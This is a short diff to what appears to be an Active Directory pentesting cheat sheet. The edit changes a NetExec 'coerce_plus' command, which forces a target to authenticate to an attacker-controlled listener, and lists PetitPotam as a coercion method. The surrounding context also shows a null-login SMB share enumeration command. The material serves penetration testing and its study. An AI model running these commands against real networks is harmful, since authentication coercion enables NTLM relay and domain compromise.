@@ -514,7 +514,7 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
   
   ### NetExec Coerce Authentication
   ```shell
-  NetExec smb <target> -u <AD_user> -p <AD_password> -M coerce_plus -o LISTENER=<AttackerIP> ALWAYS=true
+  NetExec smb <target> -u <AD_user> -p <AD_password> -M coerce_plus -o LISTENER=<AttackerIP> METHOD=<method>
   ```
   ### Methods
   * PetitPotam
